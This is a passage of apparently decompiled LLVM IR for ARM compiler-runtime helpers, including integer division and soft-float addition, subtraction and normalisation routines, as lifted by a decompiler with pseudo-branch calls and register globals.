  %v7_17574 = icmp eq i32 %v5_1757c, 4
  %v2_17578 = xor i1 %v7_17574, true
  %v3_17578 = and i1 %v2_17574, %v2_17578
  br i1 %v3_17578, label %bb111, label %bb112

bb111:                                            ; preds = %.thread21
  %v5_17578 = add nsw i32 %v4_17578, 3
  br label %bb112

bb112:                                            ; preds = %.thread21, %bb111
  %v4_1757c = phi i32 [ %v4_17578, %.thread21 ], [ %v5_17578, %bb111 ]
  %v2_1757c = xor i1 %v2_17574, true
  %v3_1757c = or i1 %v7_17574, %v2_1757c
  br i1 %v3_1757c, label %bb113, label %bb114

bb113:                                            ; preds = %bb112
  %v8_1757c = udiv i32 %v5_1757c, 2
  %v9_1757c = add i32 %v4_1757c, %v8_1757c
  br label %bb114

bb114:                                            ; preds = %bb112, %bb113
  %v1_17584 = phi i32 [ %v4_1757c, %bb112 ], [ %v9_1757c, %bb113 ]
  %v1_17580 = icmp slt i32 %v2_1747c, 0
  %v6_17584 = lshr i32 %v0_17584, %v1_17584
  %v2_17588 = sub i32 0, %v6_17584
  %v2_17588.v6_17584 = select i1 %v1_17580, i32 %v2_17588, i32 %v6_17584
  ret i32 %v2_17588.v6_17584

dec_label_pc_17590:                               ; preds = %entry
  %v0_17590 = load i32, i32* @lr, align 4
  %v0_17594 = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_17590)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_1757c, { 1, 0 }
  uselistorder i1 %v7_17574, { 1, 0 }
  uselistorder i32 %v4_1756c, { 1, 0 }
  uselistorder i32 %v1_1756c, { 1, 0, 2, 3 }
  uselistorder i32 %v4_17560, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_17560, { 1, 0, 2, 3 }
  uselistorder i32 %v4_17550, { 1, 0 }
  uselistorder i32 %v0_17514, { 1, 0 }
  uselistorder i32 %v4_17508, { 1, 0 }
  uselistorder i32 %v1_17510, { 1, 2, 0 }
  uselistorder i32 %v4_174fc, { 1, 0 }
  uselistorder i32 %v1_17504, { 1, 2, 0 }
  uselistorder i32 %v4_174f0, { 1, 0 }
  uselistorder i32 %v1_174f8, { 1, 2, 0 }
  uselistorder i32 %v1_1751c, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_174ec, { 1, 0 }
  uselistorder i32 %v1_17518, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_174d8, { 1, 0 }
  uselistorder i32 %v3_174d4, { 1, 0 }
  uselistorder i32 %v1_174d4, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_174d0, { 1, 0 }
  uselistorder i32 %v1_174d8, { 1, 2, 0, 3 }
  uselistorder i32 %v4_174c4, { 1, 0 }
  uselistorder i32 %v4_174c0, { 2, 1, 0 }
  uselistorder i32 %v1_174c4, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_174cc.pr40, { 1, 2, 0, 5, 4, 3 }
  uselistorder i1 %v3_17498, { 1, 0 }
  uselistorder i32 %v1_17550, { 5, 1, 6, 7, 3, 2, 0, 4, 8, 9, 10, 11 }
  uselistorder i32 %v2_1747c, { 1, 0, 2 }
  uselistorder i32 %v0_1747c, { 3, 2, 1, 4, 5, 6, 0 }
  uselistorder i32 ()* @__aeabi_ldiv0, { 3, 2, 0, 1 }
  uselistorder i32 268435455, { 2, 3, 0, 4, 1, 5 }
  uselistorder i32 %arg2, { 2, 3, 4, 0, 1 }
  uselistorder label %bb114, { 1, 0 }
  uselistorder label %bb112, { 1, 0 }
  uselistorder label %.thread21, { 2, 0, 1 }
  uselistorder label %.thread20, { 2, 0, 1 }
  uselistorder label %bb106, { 1, 0 }
  uselistorder label %bb103, { 1, 0 }
  uselistorder label %.thread16, { 0, 1, 2, 3, 5, 4 }
  uselistorder label %dec_label_pc_17524, { 1, 0 }
  uselistorder label %thread-pre-split12, { 0, 2, 1 }
  uselistorder label %.thread10, { 2, 0, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %dec_label_pc_174e0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_174ccthread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
  uselistorder label %bb86, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
}

define i32 @__aeabi_idivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_175a4 = sdiv i32 %arg1, %arg2
  ret i32 %v2_175a4
}

define i32 @__aeabi_drsub(i32 %arg1, double %arg2) local_unnamed_addr {
entry:
  %v1_175b8 = sub i32 0, %arg1
  %v2_175b8 = sext i32 %v1_175b8 to i64
  %v3_175bc = bitcast i64 %v2_175b8 to double
  %v9_175bc = fadd double %v3_175bc, %arg2
  %v10_175bc = fptrunc double %v9_175bc to float
  %v11_175bc = bitcast float %v10_175bc to i32
  ret i32 %v11_175bc
}

define i32 @__aeabi_dsub(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_175c0 = load i32, i32* @r0, align 4
  ret i32 %v2_175c0
}

define i32 @__adddf3(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_175c4 = load i32, i32* @r4, align 4
  store i32 %v3_175c4, i32* %stack_var_-12, align 4
  %v6_175c4 = load i32, i32* @r5, align 4
  %v0_175c8 = load i32, i32* %r0.global-to-local, align 4
  %v2_175c8 = mul i32 %v0_175c8, 2
  store i32 %v2_175c8, i32* %r4.global-to-local, align 4
  %v0_175cc = load i32, i32* %r2.global-to-local, align 4
  %v2_175cc = mul i32 %v0_175cc, 2
  store i32 %v2_175cc, i32* %r5.global-to-local, align 4
  %v4_175d0 = icmp eq i32 %v2_175cc, %v2_175c8
  %v1_175d4 = load i32, i32* %r1.global-to-local, align 4
  br i1 %v4_175d0, label %bb, label %.thread

bb:                                               ; preds = %entry
  %v2_175d4 = load i32, i32* %r3.global-to-local, align 4
  %v5_175d4 = icmp eq i32 %v2_175d4, %v1_175d4
  br i1 %v5_175d4, label %.thread3, label %.thread

.thread:                                          ; preds = %entry, %bb
  %v3_175d8 = or i32 %v1_175d4, %v2_175c8
  %v5_175d8 = icmp eq i32 %v3_175d8, 0
  br i1 %v5_175d8, label %.thread3, label %bb11

bb11:                                             ; preds = %.thread
  %v2_175dc = load i32, i32* %r3.global-to-local, align 4
  %v3_175dc = or i32 %v2_175dc, %v2_175cc
  %v5_175dc = icmp eq i32 %v3_175dc, 0
  br i1 %v5_175dc, label %.thread3, label %bb12

bb12:                                             ; preds = %bb11
  %v2_175c8.off = add i32 %v2_175c8, 4194303
  %tmp = icmp ult i32 %v2_175c8.off, 2097152
  br i1 %tmp, label %.thread3, label %bb13

bb13:                                             ; preds = %bb12
  %v2_175cc.off = add i32 %v2_175cc, 4194303
  %tmp18 = icmp ult i32 %v2_175cc.off, 2097152
  br label %.thread3

.thread3:                                         ; preds = %.thread, %bb, %bb11, %bb12, %bb13
  %v0_175e8 = phi i1 [ true, %bb11 ], [ true, %bb12 ], [ %tmp18, %bb13 ], [ true, %bb ], [ true, %.thread ]
  call void @__pseudo_cond_branch(i1 %v0_175e8, i32 ptrtoint (i32* @global_var_17808.653 to i32))
  %v0_175ec = load i32, i32* %r4.global-to-local, align 4
  %v3_175ec = udiv i32 %v0_175ec, 2097152
  store i32 %v3_175ec, i32* %r4.global-to-local, align 4
  %v1_175f0 = load i32, i32* %r5.global-to-local, align 4
  %v4_175f0 = udiv i32 %v1_175f0, 2097152
  %v5_175f0 = sub nsw i32 %v4_175f0, %v3_175ec
  %v5_175f4 = icmp ult i32 %v4_175f0, %v3_175ec
  br i1 %v5_175f4, label %bb14, label %bb15

bb14:                                             ; preds = %.thread3
  %v7_175f4 = sub nsw i32 0, %v5_175f0
  br label %bb15

bb15:                                             ; preds = %.thread3, %bb14
  %storemerge = phi i32 [ %v7_175f4, %bb14 ], [ %v5_175f0, %.thread3 ]
  %v1_17654 = phi i32 [ %v7_175f4, %bb14 ], [ %v5_175f0, %.thread3 ]
  store i32 %storemerge, i32* %r5.global-to-local, align 4
  %v7_175f8 = icmp ugt i32 %v4_175f0, %v3_175ec
  br i1 %v7_175f8, label %dec_label_pc_175fc, label %dec_label_pc_17618

dec_label_pc_175fc:                               ; preds = %bb15
  %v2_175fc = add nsw i32 %v1_17654, %v3_175ec
  store i32 %v2_175fc, i32* %r4.global-to-local, align 4
  %v0_17600 = load i32, i32* %r1.global-to-local, align 4
  %v1_17600 = load i32, i32* %r3.global-to-local, align 4
  %v0_17604 = load i32, i32* %r0.global-to-local, align 4
  %v1_17604 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_17600, i32* %r1.global-to-local, align 4
  store i32 %v1_17604, i32* %r0.global-to-local, align 4
  store i32 %v0_17600, i32* %r3.global-to-local, align 4
  store i32 %v0_17604, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_17618

dec_label_pc_17618:                               ; preds = %bb15, %dec_label_pc_175fc
  %v0_17654 = phi i32 [ %v3_175ec, %bb15 ], [ %v2_175fc, %dec_label_pc_175fc ]
  %tmp19 = icmp ugt i32 %v1_17654, 54
  br i1 %tmp19, label %bb16, label %bb17

bb16:                                             ; preds = %dec_label_pc_17618
  %v6_1761c = load i32, i32* %stack_var_-12, align 4
  store i32 %v6_1761c, i32* %r4.global-to-local, align 4
  store i32 %v6_175c4, i32* %r5.global-to-local, align 4
  %v15_1761c = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v15_1761c

bb17:                                             ; preds = %dec_label_pc_17618
  %v0_17620 = load i32, i32* %r0.global-to-local, align 4
  %v3_17620 = icmp sgt i32 %v0_17620, -1
  %v4_1762c = urem i32 %v0_17620, 1048576
  %v5_1762c = or i32 %v4_1762c, 1048576
  store i32 %v5_1762c, i32* %r0.global-to-local, align 4
  br i1 %v3_17620, label %dec_label_pc_1763c, label %dec_label_pc_17634

dec_label_pc_17634:                               ; preds = %bb17
  %v0_17634 = load i32, i32* %r1.global-to-local, align 4
  %v1_17634 = sub i32 0, %v0_17634
  store i32 %v1_17634, i32* %r1.global-to-local, align 4
  %v2_17634 = icmp eq i32 %v0_17634, 0
  %v2_17638 = icmp eq i1 %v2_17634, false
  %v5_17638 = sext i1 %v2_17638 to i32
  %v6_17638 = sub nsw i32 %v5_17638, %v5_1762c
  store i32 %v6_17638, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1763c

dec_label_pc_1763c:                               ; preds = %bb17, %dec_label_pc_17634
  %v0_1763c = load i32, i32* %r2.global-to-local, align 4
  %v3_1763c = icmp sgt i32 %v0_1763c, -1
  %v4_17644 = urem i32 %v0_1763c, 1048576
  %v5_17644 = or i32 %v4_17644, 1048576
  store i32 %v5_17644, i32* %r2.global-to-local, align 4
  br i1 %v3_1763c, label %dec_label_pc_17654, label %dec_label_pc_1764c

dec_label_pc_1764c:                               ; preds = %dec_label_pc_1763c
  %v0_1764c = load i32, i32* %r3.global-to-local, align 4
  %v1_1764c = sub i32 0, %v0_1764c
  store i32 %v1_1764c, i32* %r3.global-to-local, align 4
  %v2_1764c = icmp eq i32 %v0_1764c, 0
  %v2_17650 = icmp eq i1 %v2_1764c, false
  %v5_17650 = sext i1 %v2_17650 to i32
  %v6_17650 = sub nsw i32 %v5_17650, %v5_17644
  store i32 %v6_17650, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_17654

dec_label_pc_17654:                               ; preds = %dec_label_pc_1763c, %dec_label_pc_1764c
  %v4_17654 = icmp eq i32 %v0_17654, %v1_17654
  call void @__pseudo_cond_branch(i1 %v4_17654, i32 ptrtoint (i32* @global_var_177f0.654 to i32))
  %v1_17658 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_17658

; uselistorder directives
  uselistorder i32 %v0_1763c, { 1, 0 }
  uselistorder i32 %v0_17620, { 1, 0 }
  uselistorder i32 %v4_175f0, { 2, 1, 0 }
  uselistorder i32 %v3_175ec, { 4, 5, 3, 2, 1, 0 }
  uselistorder i32 %v1_175d4, { 1, 0 }
  uselistorder i32 %v2_175cc, { 1, 3, 0, 2 }
  uselistorder i32 %v2_175c8, { 1, 3, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r3.global-to-local, { 4, 5, 6, 0, 1, 2, 3 }
  uselistorder i32* %r2.global-to-local, { 3, 4, 5, 6, 0, 1, 2 }
  uselistorder i32* %r1.global-to-local, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 4, 3, 5, 7, 6, 8, 0, 1, 2 }
  uselistorder label %dec_label_pc_17654, { 1, 0 }
  uselistorder label %dec_label_pc_1763c, { 1, 0 }
  uselistorder label %dec_label_pc_17618, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
  uselistorder label %.thread3, { 4, 3, 2, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_1765c() local_unnamed_addr {
dec_label_pc_1765c:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %v0_1765c = load i32, i32* @r4, align 4
  %v1_1765c = add i32 %v0_1765c, -1
  store i32 %v1_1765c, i32* @r4, align 4
  %v0_17660 = load i32, i32* @r5, align 4
  %v1_17660 = sub i32 32, %v0_17660
  %v5_17664 = icmp sgt i32 %v0_17660, 32
  br i1 %v5_17664, label %dec_label_pc_17680, label %dec_label_pc_17668

dec_label_pc_17668:                               ; preds = %dec_label_pc_1765c
  %v0_17668 = load i32, i32* @r3, align 4
  %v6_17668 = shl i32 %v0_17668, %v1_17660
  store i32 %v6_17668, i32* %ip.global-to-local, align 4
  %v0_1766c = load i32, i32* @r1, align 4
  %v3_1766c = add i32 %v0_17660, -1
  %v4_1766c = shl i32 1, %v3_1766c
  %v7_1766c = lshr i32 %v0_17668, %v0_17660
  %v8_1766c = add i32 %v0_1766c, %v7_1766c
  %v9_1766c = icmp ult i32 %v8_1766c, %v0_1766c
  %v0_17670 = load i32, i32* @r0, align 4
  %v2_17670 = zext i1 %v9_1766c to i32
  %v3_17670 = add i32 %v2_17670, %v0_17670
  %v1_17674 = load i32, i32* @r2, align 4
  %v7_17674 = shl i32 %v1_17674, %v1_17660
  %v8_17674 = add i32 %v7_17674, %v8_1766c
  store i32 %v8_17674, i32* %r1.global-to-local, align 4
  %v5_17678 = and i32 %v1_17674, %v4_1766c
  %v6_17678 = icmp ne i32 %v5_17678, 0
  %v7_17678 = ashr i32 %v1_17674, %v0_17660
  %v9_17678 = add i32 %v3_17670, %v7_17678
  %v10_17678 = zext i1 %v6_17678 to i32
  %v11_17678 = add i32 %v10_17678, %v9_17678
  br label %dec_label_pc_1769c

dec_label_pc_17680:                               ; preds = %dec_label_pc_1765c
  %v1_17680 = add i32 %v0_17660, -32
  %v1_17684 = add i32 %v1_17660, 32
  %v0_1768c = load i32, i32* @r2, align 4
  %v2_1768c = add i32 %v1_17660, 31
  %v3_1768c = lshr i32 -2147483648, %v2_1768c
  %v4_1768c = and i32 %v0_1768c, %v3_1768c
  %v5_1768c = icmp ne i32 %v4_1768c, 0
  %v6_1768c = shl i32 %v0_1768c, %v1_17684
  %v2_17690 = or i32 %v6_1768c, 2
  %v2_17690.v6_1768c = select i1 %v5_1768c, i32 %v2_17690, i32 %v6_1768c
  store i32 %v2_17690.v6_1768c, i32* %ip.global-to-local, align 4
  %v0_17694 = load i32, i32* @r1, align 4
  %v7_17694 = ashr i32 %v0_1768c, %v1_17680
  %v8_17694 = add i32 %v0_17694, %v7_17694
  store i32 %v8_17694, i32* %r1.global-to-local, align 4
  %v0_17698 = load i32, i32* @r0, align 4
  %v2_17698 = and i32 %v0_1768c, 1073741824
  %v3_17698 = icmp ne i32 %v2_17698, 0
  %v4_17698 = ashr i32 %v0_1768c, 31
  %v6_17698 = add i32 %v0_17698, %v4_17698
  %v7_17698 = zext i1 %v3_17698 to i32
  %v8_17698 = add i32 %v6_17698, %v7_17698
  br label %dec_label_pc_1769c

dec_label_pc_1769c:                               ; preds = %dec_label_pc_17668, %dec_label_pc_17680
  %storemerge = phi i32 [ %v11_17678, %dec_label_pc_17668 ], [ %v8_17698, %dec_label_pc_17680 ]
  %v0_1769c = phi i32 [ %v11_17678, %dec_label_pc_17668 ], [ %v8_17698, %dec_label_pc_17680 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v1_1769c = and i32 %v0_1769c, -2147483648
  store i32 %v1_1769c, i32* @r5, align 4
  %v1_176a0 = icmp sgt i32 %v0_1769c, -1
  call void @__pseudo_cond_branch(i1 %v1_176a0, i32 ptrtoint (i32* @global_var_176b0.655 to i32))
  %v0_176a4 = load i32, i32* %ip.global-to-local, align 4
  %v1_176a4 = sub i32 0, %v0_176a4
  store i32 %v1_176a4, i32* %ip.global-to-local, align 4
  %v2_176a4 = icmp eq i32 %v0_176a4, 0
  %v0_176a8 = load i32, i32* %r1.global-to-local, align 4
  %v2_176a8 = icmp eq i1 %v2_176a4, false
  %v5_176a8 = sext i1 %v2_176a8 to i32
  %v6_176a8 = sub i32 %v5_176a8, %v0_176a8
  store i32 %v6_176a8, i32* @r1, align 4
  %v7_176a8 = zext i1 %v2_176a8 to i32
  %v8_176a8 = icmp ne i32 %v6_176a8, %v7_176a8
  %v9_176a8 = icmp ne i32 %v0_176a8, -1
  %v10_176a8 = or i1 %v9_176a8, %v8_176a8
  %v11_176a8 = icmp ne i32 %v0_176a8, 0
  %v12_176a8 = select i1 %v2_176a8, i1 %v10_176a8, i1 %v11_176a8
  %v0_176ac = load i32, i32* %r0.global-to-local, align 4
  %v5_176ac = sext i1 %v12_176a8 to i32
  %v6_176ac = sub i32 %v5_176ac, %v0_176ac
  store i32 %v6_176ac, i32* %r0.global-to-local, align 4
  ret i32 %v6_176ac

; uselistorder directives
  uselistorder i1 %v2_176a8, { 1, 2, 0 }
  uselistorder i32 %v0_176a8, { 1, 2, 0 }
  uselistorder i32 %v8_17698, { 1, 0 }
  uselistorder i32 %v0_1768c, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v11_17678, { 1, 0 }
  uselistorder i32 %v1_17674, { 1, 0, 2 }
  uselistorder i32 %v0_1766c, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_1769c, { 1, 0 }
}

define i32 @function_176b0(i32 %arg1, i64 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_176b0:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %tmp = trunc i64 %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v3_176b4 = icmp ult i32 %arg1, 1048574
  br i1 %v3_176b4, label %dec_label_pc_176f4, label %dec_label_pc_176b8

dec_label_pc_176b8:                               ; preds = %dec_label_pc_176b0
  %v3_176bc = icmp ult i32 %arg1, 2097150
  br i1 %v3_176bc, label %dec_label_pc_176dc, label %dec_label_pc_176c0

dec_label_pc_176c0:                               ; preds = %dec_label_pc_176b8
  %v1_176c0 = urem i32 %arg1, 2
  %v2_176c0 = icmp ne i32 %v1_176c0, 0
  %v3_176c0 = udiv i32 %arg1, 2
  store i32 %v3_176c0, i32* %r0.global-to-local, align 4
  %v0_176c4 = load i32, i32* %r1.global-to-local, align 4
  %v3_176c4 = zext i1 %v2_176c0 to i32
  %v6_176c4 = zext i32 %v0_176c4 to i64
  %v7_176c4 = sub i32 33, %v0_176c4
  %v8_176c4 = zext i32 %v7_176c4 to i64
  %v9_176c4 = shl i64 %v6_176c4, %v8_176c4
  %v10_176c4 = sub i32 32, %v0_176c4
  %v11_176c4 = shl i32 %v3_176c4, %v10_176c4
  %v12_176c4 = zext i32 %v11_176c4 to i64
  %v14_176c4 = or i64 %v12_176c4, %v9_176c4
  %v15_176c4 = trunc i64 %v14_176c4 to i32
  %v16_176c4 = add i32 %v0_176c4, -1
  %v17_176c4 = shl i32 1, %v16_176c4
  %v18_176c4 = and i32 %v17_176c4, %v0_176c4
  %v19_176c4 = icmp ne i32 %v18_176c4, 0
  store i32 %v15_176c4, i32* %r1.global-to-local, align 4
  %v0_176c8 = load i32, i32* @ip, align 4
  %v3_176c8 = zext i1 %v19_176c4 to i32
  %v6_176c8 = zext i32 %v0_176c8 to i64
  %v7_176c8 = sub i32 33, %v0_176c8
  %v8_176c8 = zext i32 %v7_176c8 to i64
  %v9_176c8 = shl i64 %v6_176c8, %v8_176c8
  %v10_176c8 = sub i32 32, %v0_176c8
  %v11_176c8 = shl i32 %v3_176c8, %v10_176c8
  %v12_176c8 = zext i32 %v11_176c8 to i64
  %v14_176c8 = or i64 %v12_176c8, %v9_176c8
  %v15_176c8 = trunc i64 %v14_176c8 to i32
  store i32 %v15_176c8, i32* @ip, align 4
  %v0_176cc = load i32, i32* @r4, align 4
  %v1_176cc = add i32 %v0_176cc, 1
  store i32 %v1_176cc, i32* @r4, align 4
  %v3_176d0 = mul i32 %v1_176cc, 2097152
  %v2_176d4 = icmp ugt i32 %v3_176d0, -4194305
  call void @__pseudo_cond_branch(i1 %v2_176d4, i32 ptrtoint (i32* @global_var_17868.656 to i32))
  br label %dec_label_pc_176dc

dec_label_pc_176dc:                               ; preds = %dec_label_pc_176f4, %dec_label_pc_176b8, %dec_label_pc_176c0
  %v0_176dc = load i32, i32* @ip, align 4
  %v2_176dc = icmp slt i32 %v0_176dc, 0
  %v6_176dc = icmp eq i32 %v0_176dc, -2147483648
  %v1_176e0 = load i32, i32* %r1.global-to-local, align 4
  br i1 %v6_176dc, label %bb, label %dec_label_pc_176dc._crit_edge

bb:                                               ; preds = %dec_label_pc_176dc
  %v2_176e0 = urem i32 %v1_176e0, 2
  %v3_176e0 = icmp ne i32 %v2_176e0, 0
  br label %dec_label_pc_176dc._crit_edge

dec_label_pc_176dc._crit_edge:                    ; preds = %dec_label_pc_176dc, %bb
  %v1_176e4 = phi i1 [ %v3_176e0, %bb ], [ %v2_176dc, %dec_label_pc_176dc ]
  %v2_176e4 = zext i1 %v1_176e4 to i32
  %v3_176e4 = add i32 %v2_176e4, %v1_176e0
  store i32 %v3_176e4, i32* %r1.global-to-local, align 4
  %v0_176e8 = load i32, i32* %r0.global-to-local, align 4
  %v1_176e8 = load i32, i32* @r4, align 4
  %v2_176e8 = and i32 %v1_176e8, 4096
  %v3_176e8 = icmp ne i32 %v2_176e8, 0
  %v4_176e8 = mul i32 %v1_176e8, 1048576
  %v6_176e8 = add i32 %v4_176e8, %v0_176e8
  %v7_176e8 = zext i1 %v3_176e8 to i32
  %v8_176e8 = add i32 %v7_176e8, %v6_176e8
  %v1_176ec = load i32, i32* @r5, align 4
  %v2_176ec = or i32 %v1_176ec, %v8_176e8
  store i32 %v2_176ec, i32* %r0.global-to-local, align 4
  ret i32 %v2_176ec

dec_label_pc_176f4:                               ; preds = %dec_label_pc_176b0
  %v0_176f4 = load i32, i32* @ip, align 4
  %v1_176f4 = icmp slt i32 %v0_176f4, 0
  %v2_176f4 = mul i32 %v0_176f4, 2
  store i32 %v2_176f4, i32* @ip, align 4
  %v0_176f8 = load i32, i32* %r1.global-to-local, align 4
  %v3_176f8 = mul i32 %v0_176f8, 2
  %v4_176f8 = zext i1 %v1_176f4 to i32
  %v5_176f8 = or i32 %v3_176f8, %v4_176f8
  store i32 %v5_176f8, i32* %r1.global-to-local, align 4
  %v9_176f8 = icmp ule i32 %v5_176f8, %v0_176f8
  %v10_176f8 = icmp ult i32 %v3_176f8, %v0_176f8
  %v11_176f8 = select i1 %v1_176f4, i1 %v9_176f8, i1 %v10_176f8
  %v3_176fc = mul i32 %arg1, 2
  %v4_176fc = zext i1 %v11_176f8 to i32
  %v5_176fc = or i32 %v4_176fc, %v3_176fc
  store i32 %v5_176fc, i32* %r0.global-to-local, align 4
  %v1_17700 = and i32 %v3_176fc, 1048576
  %v2_17700 = icmp eq i32 %v1_17700, 0
  %v0_17704 = load i32, i32* @r4, align 4
  %v1_17704 = add i32 %v0_17704, -1
  store i32 %v1_17704, i32* @r4, align 4
  br i1 %v2_17700, label %bb7, label %dec_label_pc_176dc

bb7:                                              ; preds = %dec_label_pc_176f4
  ret i32 %v5_176fc

; uselistorder directives
  uselistorder i32 %v0_176f8, { 1, 2, 0 }
  uselistorder i1 %v1_176f4, { 1, 0 }
  uselistorder i32 %v1_176e0, { 1, 0 }
  uselistorder i32 %v0_176dc, { 1, 0 }
  uselistorder i32 %v0_176c8, { 1, 0, 2 }
  uselistorder i32 %v0_176c4, { 0, 3, 2, 1, 4 }
  uselistorder i32* %r1.global-to-local, { 3, 0, 4, 5, 6, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32 %arg1, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_176dc._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_176dc, { 0, 2, 1 }
}

define i32 @function_1770c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1770c:
  %v2_1770c = icmp eq i32 %arg1, 0
  br i1 %v2_1770c, label %bb35, label %bb

bb:                                               ; preds = %dec_label_pc_1770c
  br label %.thread

bb35:                                             ; preds = %dec_label_pc_1770c
  %v1_1771810 = load i32, i32* @r1, align 4
  store i32 0, i32* @r1, align 4
  br label %.thread

.thread:                                          ; preds = %bb, %bb35
  %v0_17774 = phi i32 [ %arg1, %bb ], [ %v1_1771810, %bb35 ]
  %v1_1772c = phi i32 [ 20, %bb ], [ 52, %bb35 ]
  %v2_17724 = icmp ugt i32 %v0_17774, 65535
  br i1 %v2_17724, label %bb36, label %.thread3

bb36:                                             ; preds = %.thread
  %v2_17728 = and i32 %v0_17774, 32768
  %v3_17728 = icmp eq i32 %v2_17728, 0
  %v4_17728 = udiv i32 %v0_17774, 65536
  br i1 %v3_17728, label %.thread3, label %bb37

bb37:                                             ; preds = %bb36
  %v2_1772c = add nsw i32 %v1_1772c, -16
  br label %.thread3

.thread3:                                         ; preds = %bb36, %.thread, %bb37
  %v1_17738 = phi i32 [ %v1_1772c, %.thread ], [ %v1_1772c, %bb36 ], [ %v2_1772c, %bb37 ]
  %v1_17734 = phi i32 [ %v0_17774, %.thread ], [ %v4_17728, %bb36 ], [ %v4_17728, %bb37 ]
  %v2_17730 = icmp ugt i32 %v1_17734, 255
  br i1 %v2_17730, label %bb38, label %.thread4

bb38:                                             ; preds = %.thread3
  %v2_17734 = and i32 %v1_17734, 128
  %v3_17734 = icmp eq i32 %v2_17734, 0
  %v4_17734 = udiv i32 %v1_17734, 256
  br i1 %v3_17734, label %.thread4, label %bb39

bb39:                                             ; preds = %bb38
  %v2_17738 = add nsw i32 %v1_17738, -8
  br label %.thread4

.thread4:                                         ; preds = %bb38, %.thread3, %bb39
  %v1_17744 = phi i32 [ %v1_17738, %.thread3 ], [ %v1_17738, %bb38 ], [ %v2_17738, %bb39 ]
  %v1_17740 = phi i32 [ %v1_17734, %.thread3 ], [ %v4_17734, %bb38 ], [ %v4_17734, %bb39 ]
  %v2_1773c = icmp ugt i32 %v1_17740, 15
  br i1 %v2_1773c, label %bb40, label %.thread5

bb40:                                             ; preds = %.thread4
  %v2_17740 = and i32 %v1_17740, 8
  %v3_17740 = icmp eq i32 %v2_17740, 0
  %v4_17740 = udiv i32 %v1_17740, 16
  br i1 %v3_17740, label %.thread5, label %bb41

bb41:                                             ; preds = %bb40
  %v2_17744 = add nsw i32 %v1_17744, -4
  br label %.thread5

.thread5:                                         ; preds = %bb40, %.thread4, %bb41
  %v1_1774c = phi i32 [ %v1_17744, %.thread4 ], [ %v1_17744, %bb40 ], [ %v2_17744, %bb41 ]
  %v1_17754 = phi i32 [ %v1_17740, %.thread4 ], [ %v4_17740, %bb40 ], [ %v4_17740, %bb41 ]
  %v2_17748 = icmp ugt i32 %v1_17754, 3
  br i1 %v2_17748, label %bb42, label %.thread6

bb42:                                             ; preds = %.thread5
  %v2_1774c = add i32 %v1_1774c, -2
  br label %bb43

.thread6:                                         ; preds = %.thread5
  %v5_17750 = udiv i32 %v1_17754, 2
  %v6_17750 = sub i32 %v1_1774c, %v5_17750
  br label %bb43

bb43:                                             ; preds = %bb42, %.thread6
  %v0_17754 = phi i32 [ %v6_17750, %.thread6 ], [ %v2_1774c, %bb42 ]
  %v4_17754 = udiv i32 %v1_17754, 8
  %v5_17754 = sub i32 %v0_17754, %v4_17754
  %v2_17758 = add i32 %v5_17754, -32
  %v4_17758 = sub i32 31, %v5_17754
  %v5_17758 = and i32 %v4_17758, %v5_17754
  %v8_17758 = icmp eq i32 %v5_17754, 32
  %v6_1775c = icmp slt i32 %v5_17754, 32
  br i1 %v6_1775c, label %dec_label_pc_17760, label %dec_label_pc_17780

dec_label_pc_17760:                               ; preds = %bb43
  %v2_17760 = add i32 %v5_17754, -20
  %v7_17764 = icmp sgt i32 %v2_17758, -12
